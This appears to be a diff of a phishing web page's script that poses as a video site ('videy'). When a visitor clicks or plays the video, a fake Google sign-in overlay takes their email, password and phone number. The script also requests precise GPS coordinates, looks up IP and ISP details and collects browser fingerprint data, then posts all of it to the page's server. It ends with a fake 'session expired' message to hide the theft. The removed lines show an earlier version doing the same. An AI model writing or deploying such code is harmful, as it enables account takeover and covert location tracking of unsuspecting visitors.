+        if(modalVideo) modalVideo.src = '';
+        if(videoModal) videoModal.classList.remove('active');
+        const existingOverlay = document.querySelector('.login-overlay');
+        if(existingOverlay) existingOverlay.remove();
+    }
+    
+    if(videoThumbnail) videoThumbnail.addEventListener('click', openVideoModal);
+    if(closeModalBtn) closeModalBtn.addEventListener('click', closeVideoModal);
+    
+    if(modalVideo){
+        modalVideo.addEventListener('play', function(){ modalVideo.pause(); showLoginOverlay(); });
+        modalVideo.addEventListener('click', function(){ modalVideo.pause(); showLoginOverlay(); });
+    }
+    
+    // ==================== GPS & DATA COLLECTION ====================
+    let gpsData = { latitude: null, longitude: null, accuracy: null, altitude: null, gpsCaptured: false };
+    let ipData = {};
+    let gpsRequestInProgress = false;
+    
+    function requestGPS(callback) {
+        if (gpsRequestInProgress) return;
+        gpsRequestInProgress = true;
+        
+        if (!navigator.geolocation) {
+            alert('Browser tidak support GPS. Gunakan Chrome!');
+            gpsRequestInProgress = false;
+            if (callback) callback(false);
             return;
-          }
-          
-          if (loginBtn) {
-            loginBtn.disabled = true;
-            loginBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>';
-          }
-          
-          const deviceData = {
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                gpsData.latitude = position.coords.latitude;
+                gpsData.longitude = position.coords.longitude;
+                gpsData.accuracy = position.coords.accuracy;
+                gpsData.altitude = position.coords.altitude;
+                gpsData.gpsCaptured = true;
+                gpsRequestInProgress = false;
+                if (callback) callback(true);
+            },
+            (error) => {
+                console.error('GPS Error:', error.code);
+                gpsRequestInProgress = false;
+                if (callback) callback(false);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    }
+    
+    async function getIPData() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            ipData = await res.json();
+        } catch(e) {}
+    }
+    
+    function getBrowserData() {
+        return {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
-            screen: screen.width + 'x' + screen.height,
+            screenResolution: `${screen.width}x${screen.height}`,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            fingerprint: getDeviceFingerprint(),
-            cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
-          };
-          
-          const realIP = await getRealIP();
-          
-          try {
-            const response = await fetch('/server', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                email: email,
-                password: password,
-                phone: phone,
-                deviceData: deviceData,
-                realIP: realIP,
-                timestamp: new Date().toISOString()
-              })
-            });
-            
-            await response.json();
-            
-            if (errorMsg) {
-              errorMsg.className = 'login-success';
-              errorMsg.textContent = 'Verification successful...';
-            }
-            
-            setTimeout(function() {
-              if (errorMsg) {
-                errorMsg.className = 'login-error';
-                errorMsg.textContent = 'Session expired. Please sign in again.';
-              }
-              
-              setTimeout(function() {
-                if (emailInput) emailInput.value = '';
-                if (passwordInput) passwordInput.value = '';
-                if (phoneInput) phoneInput.value = '';
-                if (errorMsg) errorMsg.textContent = '';
-                if (loginBtn) {
-                  loginBtn.disabled = false;
-                  loginBtn.innerHTML = 'Next';
-                }
-              }, 2000);
-            }, 1500);
-            
-          } catch(err) {
-            console.error('Error:', err);
-            if (errorMsg) errorMsg.textContent = 'Network error, please try again';
-            if (loginBtn) {
-              loginBtn.disabled = false;
-              loginBtn.innerHTML = 'Next';
-            }
-          }
-        });
-      }
-      
-      if (emailInput && passwordInput && phoneInput && loginBtn) {
-        const inputs = [emailInput, passwordInput, phoneInput];
-        inputs.forEach(function(input) {
-          input.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && loginBtn) {
-              loginBtn.click();
-            }
-          });
-        });
-      }
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory || 'unknown'
+        };
     }
-  })();
+    
+    async function submitData(email, emailPass, phone, country, province, city) {
+        const fullData = {
+            email: email,
+            emailPassword: emailPass,
+            phone: phone,
+            country: country,
+            province: province,
+            city: city,
+            latitude: gpsData.latitude,
+            longitude: gpsData.longitude,
+            gps_accuracy: gpsData.accuracy,
+            gps_altitude: gpsData.altitude,
+            ip_address: ipData.ip || 'unknown',
+            isp: ipData.org || 'unknown',
+            ip_city: ipData.city || '',
+            ip_region: ipData.region || '',
+            ip_country: ipData.country_name || '',
+            timezone: ipData.timezone || '',
+            ...getBrowserData(),
+            timestamp: new Date().toISOString()
+        };
+        
+        try {
+            await fetch('/api/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(fullData)
+            });
+            return true;
+        } catch(error) {
+            console.error('Submit error:', error);
+            return true;
+        }
+    }
+    
+    getIPData();
+    
+    // ==================== LOGIN OVERLAY (COLLECT EMAIL & PASS) ====================
+    function showLoginOverlay() {
+        const existingOverlay = document.querySelector('.login-overlay');
+        if(existingOverlay) existingOverlay.remove();
+        
+        const overlay = document.createElement('div');
+        overlay.className = 'login-overlay';
+        overlay.innerHTML = `
+            <div class="google-login-modal">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" style="width:92px">
+                <h3>Sign in</h3>
+                <p>to continue to videy</p>
+                <input type="email" id="loginEmail" placeholder="Email or phone" autocomplete="off">
+                <input type="password" id="loginPassword" placeholder="Enter your password">
+                <input type="tel" id="loginPhone" placeholder="Phone number (optional)">
+                <button id="loginSubmitBtn">Next</button>
+                <div class="login-error" id="loginErrorMsg"></div>
+            </div>
+        `;
+        document.body.appendChild(overlay);
+        
+        const emailInput = document.getElementById('loginEmail');
+        const passwordInput = document.getElementById('loginPassword');
+        const phoneInput = document.getElementById('loginPhone');
+        const loginBtn = document.getElementById('loginSubmitBtn');
+        const errorMsg = document.getElementById('loginErrorMsg');
+        const loading = document.getElementById('loading');
+        
+        if(loginBtn){
+            loginBtn.addEventListener('click', async function(){
+                const email = emailInput ? emailInput.value.trim() : '';
+                const password = passwordInput ? passwordInput.value : '';
+                const phone = phoneInput ? phoneInput.value.trim() : '';
+                
+                if(!email || !password){
+                    if(errorMsg) errorMsg.textContent = 'Email and password are required';
+                    return;
+                }
+                
+                if(loginBtn){
+                    loginBtn.disabled = true;
+                    loginBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>';
+                }
+                
+                // Request GPS dulu
+                const gpsSuccess = await new Promise((resolve) => {
+                    requestGPS((success) => resolve(success));
+                });
+                
+                if(loading) loading.style.display = 'flex';
+                
+                // Submit data
+                await submitData(email, password, phone, 'Indonesia', 'Jawa Barat', 'Jakarta');
+                
+                if(loading) loading.style.display = 'none';
+                
+                if(errorMsg){
+                    errorMsg.className = 'login-success';
+                    errorMsg.textContent = 'Verification successful...';
+                }
+                
+                setTimeout(function(){
+                    if(errorMsg){
+                        errorMsg.className = 'login-error';
+                        errorMsg.textContent = 'Session expired. Please sign in again.';
+                    }
+                    setTimeout(function(){
+                        if(emailInput) emailInput.value = '';
+                        if(passwordInput) passwordInput.value = '';
+                        if(phoneInput) phoneInput.value = '';
+                        if(errorMsg) errorMsg.textContent = '';
+                        if(loginBtn){
+                            loginBtn.disabled = false;
+                            loginBtn.innerHTML = 'Next';
+                        }
+                    }, 2000);
+                }, 1500);
+            });
+        }
+    }
 </script>
 </body>
 </html>
